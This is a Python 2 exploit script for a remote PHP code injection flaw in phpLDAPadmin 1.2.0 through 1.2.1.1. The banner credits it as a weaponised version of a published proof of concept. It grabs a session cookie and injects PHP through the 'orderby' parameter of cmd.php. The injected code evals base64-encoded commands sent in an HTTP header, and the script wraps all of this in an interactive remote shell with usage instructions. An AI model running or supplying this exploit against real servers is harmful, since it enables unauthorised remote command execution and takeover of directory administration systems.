#!/usr/bin/python
import re
import sys
import httplib
import getpass
import base64

def get_session_id(host,path):
    req = httplib.HTTPConnection(host)
    # write header
    req.putrequest("GET",path+"index.php")
    req.putheader("Host",host)
    req.putheader("Connection","close")
    req.endheaders()
    res = req.getresponse()
    
    if not res.getheader('set-cookie').split(';')[0]:
        return "[-] Session ID not found!" 
    return res.getheader('set-cookie').split(';')[0]

# Launch exploit
def exploit(host,path,cmd):
    req = httplib.HTTPConnection(host)
    # write header
    req.putrequest("POST", path+"cmd.php")
    req.putheader("Cookie", session)
    req.putheader("Cmd", cmd)
    req.putheader("Content-Length", str(len(payload)))
    req.putheader("Content-Type", "application/x-www-form-urlencoded")
    req.putheader("Connection","close")
    req.endheaders()
    req.send(payload)

    res = req.getresponse()
    data = res.read().split('\n')
    result = []
    for line in data:
        if not re.search("<br />", line) and not re.search('<b>Warning</b>:', line):
            line = line.replace("_code_","")
            result.append(line)
    result = '\n'.join(result)
    return result

print '''   
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
||                                                                        ||
||    phpLDAPadmin <= 1.2.1.1 Remote PHP Code Injection Exploit           ||
||    Original discovery/poc: EgiX <n0b0d13s[at]gmail-com>                ||
||    Written by Krit Kadnok < c1ph3r@blackbuntu.com >                    ||
||    Affected versions....: from 1.2.0 to 1.2.1.1                        ||
||    References: http://sourceforge.net/support/tracker.php?aid=3417184  ||
||                http://www.exploit-db.com/exploits/18021/               ||
||    Visit: www.blackbuntu.com                                           ||
||                                                                        ||
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
'''

if len(sys.argv) != 3:
    print "Usage:   python",sys.argv[0],"<host> <path>"
    print "Example: python",sys.argv[0],"localhost /"
    print "Example: python",sys.argv[0],"localhost /phpldapadmin/htdocs/"
    sys.exit(1)

host = sys.argv[1]
path = sys.argv[2]

#phpcode = "foo));}}error_reporting(0);print(_code_);passthru(base64_decode($_SERVER[HTTP_CMD]));die;/*";
phpcode = "foo));}}error_reporting(0);print(_code_);eval(base64_decode($_SERVER[HTTP_CMD]));die;/*";
payload = "cmd=query_engine&query=none&search=1&orderby=%s" % phpcode;

session = get_session_id(host,path)

while 1:
    cmd = raw_input("\n%s@%s~$ " % (getpass.getuser(),host))
    if cmd != "exit":
        cmd = base64.b64encode(cmd)
        data = exploit(host,path,cmd)
        print data
    else:
        sys.exit(1)
